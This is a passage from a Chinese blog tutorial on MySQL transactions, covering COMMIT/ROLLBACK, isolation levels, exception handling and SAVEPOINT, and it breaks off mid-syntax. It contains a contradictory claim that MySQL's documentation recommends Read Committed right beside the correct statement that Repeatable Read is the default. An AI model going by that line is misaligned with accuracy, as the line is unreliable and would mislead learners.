COMMIT： 在所有的数据库操作都成功执行后，我们可以提交事务。这个操作实际告诉DBMS，操作是成功的，可以将数据持久化到磁盘上。一旦COMMIT命令被执行，事务结束，而且不能回滚。ROLLBACK： 如果在操作过程中出现了错误，或者用户执行了一个撤销操作，那么我们可以回滚事务。简单地说，ROLLBACK操作将数据库的状态恢复到BEGIN TRANSACTION之前。 2. 事务的隔离级别 2.1 不同的隔离级别比较 在MySQL中，事务隔离级别是一个核心概念，用来控制同时运行的交易如何“隔离”或与偶然影响彼此的问题。它可以定义为四个级别：
**读未提交（Read uncommitted)：**这是最低的隔离级别，允许事务查看尚未提交的更改。在这个级别下，一个事务可以看到另一个事务未提交的结果，有可能导致“脏读”（Dirty Reads）问题。
**读提交（Read committed)：**这是大多数数据库系统的默认隔离级别。MySQL官方文档建议的隔离级别。在这个级别下，一个事务只能看见已经提交的事务所做的更改，避免了“脏读”，但仍然可能发生“不可重复读”和“幻读”等问题。
**可重复读（Repeatable read)：**这是MySQL的默认隔离级别。在一个事务内部，多次读取的结果是一致的，即使在此期间有其他事务进行了修改。它解决了“不可重复读”的问题，但可能导致“幻读”。
**串行化（Serializable)：**所有并发事务都被转化为顺序运行。即，在同一时间内，只能有一个事务在运行，彻底杜绝了一切并发产生的问题，但是效率低下。
2.2 选择合适的隔离级别 在实际应用中，选择正确的隔离级别是至关重要的。如果需要确保数据库的绝对一致性，最好使用Serializable隔离级别，即使这可能牺牲了部分性能。但是在需要高并发、高吞吐率的应用场景下，比如高流量的Web应用，较低的隔离级别，如读提交，可能是更好的选择。
不仅如此，MySQL提供的InnoDB存储引擎通过实现多版本并发控制(MVCC)和Next-Key Lock等技术，可以在Repeatable read隔离级别下避免“脏读”、“不可重复读”和“幻读”问题，同时保持高并发性能。
设置隔离级别的语句很简单，如设置为 Serializable，只需执行以下语句：
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE; 3. 事务的异常处理 当我们在数据库中进行事务处理时，需要考虑可能出现的一切异常并准备好相应的解决方案。在MySQL中，我们有以下几种方式可以处理事务的异常。
3.1 事务中的异常处理机制 在MySQL中，处理事务中异常的基本策略是：如果发生了一个错误，那么当前正在进行的事务将会被终止并回滚。
假设你试图在一个事务中插入一个违反数据库完整性规则的数据，例如，试图插入一个已经存在的唯一键。在这种情况下，MySQL将会引发一个错误，并停止当前的事务。这种情况下，你可以选择让MySQL引发的错误传播到客户端，或者在应用程序中捕捉这个错误并进行恢复。
对于MySQL来说，一种有效的异常处理方法是使用声明式条件处理程序。你可以设置一个处理程序，让数据库捕捉特定的错误并执行一段代码。这可以用来记录错误，或者让事务回滚到一个安全的状态。
3.2 使用SAVEPOINT实现更灵活的事务控制 除了基本的COMMIT和ROLLBACK之外，MySQL还提供了一个用于更复杂事务控制的功能：SAVEPOINT。SAVEPOINT允许你在事务中标记一个点，你可以随时回滚到这个点，而不是必须回滚整个事务。
例如，假设你有一个用户注册过程，需要在几个表中插入数据。在这个过程中，你可以在每次插入数据之前设置一个SAVEPOINT。如果一次插入失败，你可以回滚到最近的SAVEPOINT，而不是取消整个注册过程。
使用SAVEPOINT的语法如下：
SAVEPOINT savepoint_name; 你可以通过ROLLBACK命令回滚到一个SAVEPOINT，语法如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4241287f7d40ed834539455bc3389204/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/11/">«</a>
	<span class="pagination__item pagination__item--current">12/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/13/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>